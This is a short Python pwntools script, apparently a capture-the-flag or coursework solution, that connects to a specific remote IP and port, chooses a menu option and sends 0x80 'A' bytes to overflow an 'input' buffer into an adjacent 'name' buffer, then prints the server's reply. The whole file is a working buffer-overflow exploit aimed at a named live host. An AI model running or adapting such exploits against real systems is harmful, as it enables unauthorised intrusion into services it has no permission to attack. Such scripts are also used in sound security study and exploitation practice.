from pwn import *

# Connect to the server
r = remote('140.113.24.241', 30174)

# Overflow the 'input' array to overwrite the 'name' array
r.sendlineafter('Input your choice:', '1')
r.sendlineafter('> ', 'A'*0x80)

# Print the server's response
print(r.recvall().decode())